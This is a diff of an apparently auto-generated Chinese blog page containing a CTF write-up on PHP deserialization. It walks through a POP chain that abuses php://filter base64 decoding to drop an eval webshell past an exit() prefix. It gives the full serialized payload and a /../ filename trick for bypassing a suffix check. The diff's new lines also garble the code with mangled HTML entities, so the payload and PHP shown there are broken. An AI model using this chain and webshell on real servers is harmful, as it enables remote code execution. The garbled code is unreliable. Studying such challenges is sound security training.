@@ -440,7 +440,7 @@ key = $key;
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.5k
+                        1.6k
                     </div>
                     
 
@@ -467,7 +467,7 @@ key = $key;
 <pre class=" language-PHP"><code class="language-PHP"><?php
 error_reporting(0);
 
-class A {
+class A &#123
 
     protected $store;
 
@@ -475,117 +475,117 @@ class A {
 
     protected $expire;
 
-    public function __construct($store, $key = 'flysystem', $expire = null) {
+    public function __construct($store, $key = 'flysystem', $expire = null) &#123
         $this->key = $key;
         $this->store = $store;
         $this->expire = $expire;
-    }
+    &#125
 
-    public function cleanContents(array $contents) {
+    public function cleanContents(array $contents) &#123
         $cachedProperties = array_flip([
             'path', 'dirname', 'basename', 'extension', 'filename',
             'size', 'mimetype', 'visibility', 'timestamp', 'type',
         ]);
 
-        foreach ($contents as $path => $object) {
-            if (is_array($object)) {
+        foreach ($contents as $path => $object) &#123
+            if (is_array($object)) &#123
                 $contents[$path] = array_intersect_key($object, $cachedProperties);
-            }
-        }
+            &#125
+        &#125
 
         return $contents;
-    }
+    &#125
 
-    public function getForStorage() {
+    public function getForStorage() &#123
         $cleaned = $this->cleanContents($this->cache);
 
         return json_encode([$cleaned, $this->complete]);
-    }
+    &#125
 
-    public function save() {
+    public function save() &#123
         $contents = $this->getForStorage();
 //        print $contents;
         $this->store->set($this->key, $contents, $this->expire);
-    }
+    &#125
 
-    public function __destruct() {
-        if (!$this->autosave) {
+    public function __destruct() &#123
+        if (!$this->autosave) &#123
             $this->save();
-        }
-    }
-}
+        &#125
+    &#125
+&#125
 
-class B {
+class B &#123
 
-    protected function getExpireTime($expire): int {
+    protected function getExpireTime($expire): int &#123
         return (int) $expire;
-    }
+    &#125
 
-    public function getCacheKey(string $name): string {
+    public function getCacheKey(string $name): string &#123
         return $this->options['prefix'] . $name;
-    }
+    &#125
 
-    protected function serialize($data): string {
-        if (is_numeric($data)) {
+    protected function serialize($data): string &#123
+        if (is_numeric($data)) &#123
             return (string) $data;
-        }
+        &#125
 
         $serialize = $this->options['serialize'];
 
         return $serialize($data);
-    }
+    &#125
 
-    public function set($name, $value, $expire = null): bool{
+    public function set($name, $value, $expire = null): bool&#123
         $this->writeTimes++;
 
-        if (is_null($expire)) {
+        if (is_null($expire)) &#123
             $expire = $this->options['expire'];
-        }
+        &#125
 
         $expire = $this->getExpireTime($expire);
         $filename = $this->getCacheKey($name);
 
         $dir = dirname($filename);
 
-        if (!is_dir($dir)) {
-            try {
+        if (!is_dir($dir)) &#123
+            try &#123
                 mkdir($dir, 0755, true);
-            } catch (\Exception $e) {
+            &#125 catch (\Exception $e) &#123
                 // 创建失败
-            }
-        }
+            &#125
+        &#125
 
         $data = $this->serialize($value);
 
-        if ($this->options['data_compress'] && function_exists('gzcompress')) {
+        if ($this->options['data_compress'] && function_exists('gzcompress')) &#123
             //数据压缩
             $data = gzcompress($data, 3);
-        }
+        &#125
 
-        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
+        $data = "<?php\n//" . sprintf('&#37012d', $expire) . "\n exit();?>\n" . $data;
 //        print $data;
         $result = file_put_contents($filename, $data);
 
-        if ($result) {
+        if ($result) &#123
             return true;
-        }
+        &#125
 
         return false;
-    }
+    &#125
 
-}
+&#125
 
 if (isset($_GET['src']))
-{
+&#123
     highlight_file(__FILE__);
-}
+&#125
 
 $dir = "uploads/";
 
 if (!is_dir($dir))
-{
+&#123
     mkdir($dir);
-}
+&#125
 unserialize($_GET["data"]);
 
 $b = new B();
@@ -593,23 +593,23 @@ $b->options['serialize'] = "strval";
 $b->options['prefix'] = "php://filter/write=convert.base64-decode/resource=./uploads/";
 $a = new A($b, 'z3ratu1.php');
 $a->cache = array('dirname'=> "PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4");
-echo str_replace(' ','%',serialize($a));</code></pre>
-<p>定义两个类，魔法方法就A中一个构造一个析构，能用的只有析构，析构直接进save，save函数仅在B类中存在，也就省去了有的题目还要思考是走哪个类的pop链的问题<br>类A最后会通过析构进入类B的save函数中，所以store这个对象肯定是一个B，类A剩下两个函数都是对content内容进行加工，但是就我做题情况而言，好像这两个函数都没什么用。。。<br>总的效果就是如果数组中存在一个值仍为数组，就把他和写死的数组比较然后返回键名相同的项，最后通过json_encode一下，<br>最后这个值会在save函数里作为data的内容拼接一个exit写入文件，剩下的A，B两个类里面的大部分参数都是直接可以控制的，A中的key为写入的文件名，B中的option[‘prefix’]是目录名<br>options[‘expire’]不知道有什么用，一通类型转换之后写进了注释里面，<code>sprintf(&#39;%012d&#39;, $expire)</code>这里的%012d表示最短12位的数字，不足12位用0填充<br>option[‘serialize’]中对应的函数名对我们传入的数据进行一次处理，什么都不做就可以了，选择strval()<br>options[‘data_compress’]不知道是想干什么，是不是把自己写入的字符串压缩一下到时候可以在写入的时候用伪协议解压写入来绕过死亡exit？<br>但是file_put_contents也支持其他协议，比如php://filter，我们把shell先用base64编码传入，用base64解码将整个内容解码写入就可以绕过死亡exit了，这个是个很老的trick，以前看p神的博客有写过<br>整个题重点就是一个<code>option[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=upload/&#39;</code></p>
+echo str_replace(' ','&#37',serialize($a));</code></pre>
+<p>定义两个类，魔法方法就A中一个构造一个析构，能用的只有析构，析构直接进save，save函数仅在B类中存在，也就省去了有的题目还要思考是走哪个类的pop链的问题<br>类A最后会通过析构进入类B的save函数中，所以store这个对象肯定是一个B，类A剩下两个函数都是对content内容进行加工，但是就我做题情况而言，好像这两个函数都没什么用。。。<br>总的效果就是如果数组中存在一个值仍为数组，就把他和写死的数组比较然后返回键名相同的项，最后通过json_encode一下，<br>最后这个值会在save函数里作为data的内容拼接一个exit写入文件，剩下的A，B两个类里面的大部分参数都是直接可以控制的，A中的key为写入的文件名，B中的option[‘prefix’]是目录名<br>options[‘expire’]不知道有什么用，一通类型转换之后写进了注释里面，<code>sprintf(&#39;&amp;#37012d&#39;, $expire)</code>这里的&amp;#37012d表示最短12位的数字，不足12位用0填充<br>option[‘serialize’]中对应的函数名对我们传入的数据进行一次处理，什么都不做就可以了，选择strval()<br>options[‘data_compress’]不知道是想干什么，是不是把自己写入的字符串压缩一下到时候可以在写入的时候用伪协议解压写入来绕过死亡exit？<br>但是file_put_contents也支持其他协议，比如php://filter，我们把shell先用base64编码传入，用base64解码将整个内容解码写入就可以绕过死亡exit了，这个是个很老的trick，以前看p神的博客有写过<br>整个题重点就是一个<code>option[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=upload/&#39;</code></p>
 <h2 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h2><p>看清这些代码在干什么并不难，只要能想到死亡exit的绕过题目难度就不大，而这里的编码解码绕过是有一点点小坑的<br>base64编码以3个字节为一组，编码成4个字节一组的字符串，末尾不足的位数用=补齐，所以我们得让最后的data处我们shell前面的字符是4的倍数才能使得他被正确解码<br>我为了统计字数看了一下data的内容</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token comment" spellcheck="true">//000000000000</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
-<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"dirname"</span><span class="token punctuation">:</span><span class="token string">"PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">]</span></code></pre>
+<span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span><span class="token string">"dirname"</span><span class="token punctuation">:</span><span class="token string">"PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4"</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125,null]</span></code></pre>
 <p>这里的</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token comment" spellcheck="true">//000000000000</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
-<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"dirname"</span><span class="token punctuation">:</span>"</code></pre>
+<span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span><span class="token string">"dirname"</span><span class="token punctuation">:</span>"</code></pre>
 <p>长度一共是45，但是编码是能刚好成功的，可以说是运气好碰上的，因为这里面有很多base64编码后不存在的字符，例如空格，?&gt;();等，这些字符在解码时全部被忽略了，换行符什么的都一样，所以实际上参与解码的内容就只剩下了<code>php//000000000000exitdirnamePD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4null</code><br>所以凑字符串的时候还是要注意一下怎么回事<br>还有一个点在于我们的shell<code>&lt;?php eval($_GET[&#39;a&#39;]); ?&gt;</code>编码的结果其实是<code>PD9waHAgZXZhbCgkX0dFVFsnYSddKTsgPz4=</code>末尾有一位等号填充，但是如果把这个等号也放进去的话，shell里面就写不进去了，（我猜测）是因为=是编码结束之后用来填充的内容，但是这里在shell后面还有内容，解码的时候却突然遇到了一个=，导致解码出错了</p>
 <p>A类里面的那个对比数组的方法我还是不知道有什么用，因为只要我的数组值不是数组它就无法对我造成影响，我shell前面那个键值随便写什么都不会有影响，也不存在用那个函数去调整前面的字符凑编码</p>
 <p>payload </p>
-<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">" * store"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">"options"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"serialize"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"strval"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"prefix"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">:</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=./uploads/";}}s:6:" * key";s:11:"z3ratu1.php";s:9:" * expire";N;s:5:"cache";a:1:{s:7:"dirname";s:35:"PD9waHAgZXZhbCgkX0dFVFsiYSJdKTsgPz4";}}</span></code></pre>
-<p>空格为protected变量的标识符，实际上url编码为%00</p>
+<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123s:8:</span><span class="token string">" * store"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123s:7:</span><span class="token string">"options"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123s:9:</span><span class="token string">"serialize"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"strval"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"prefix"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">:</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=./uploads/";&amp;#125&amp;#125s:6:" * key";s:11:"z3ratu1.php";s:9:" * expire";N;s:5:"cache";a:1:&amp;#123s:7:"dirname";s:35:"PD9waHAgZXZhbCgkX0dFVFsiYSJdKTsgPz4";&amp;#125&amp;#125</span></code></pre>
+<p>空格为protected变量的标识符，实际上url编码为&amp;#3700</p>
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>buu上还有一个新春红包题，和这个题基本一模一样，就是在文件名前面拼接了一个随机字符串，然后又检查了后缀是否为.php<br>由于前面有一个死亡exit，没法传htaccess来解析其他后缀，而php5,phtml等后缀又不能解析<br>生成的随机字符串无法获取，也就无法知道上传的文件名<br>因此稍微修改一下payload，只需要整体在key上面动动手脚就可以<br>新payload的key为: <code>/../z3ratu1.php/.</code>，通过/../将之前的随机字符串作为一个目录，而再用..跳出，这样子就绕过随机字符串，控制了文件名，而最后的/.仍为当前工作目录，是以前看到过的一个绕后缀的trick，这样子就能绕过后缀检测在目录下创建php文件</p>
 
             </div>
@@ -1021,7 +1021,7 @@ include 'config.php'; // FLAG is defined in con
         <div class="col s12 m8 l8 copy-right">
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">44.6k</span>&nbsp;字
+                class="white-color">46.1k</span>&nbsp;字
             
             
             
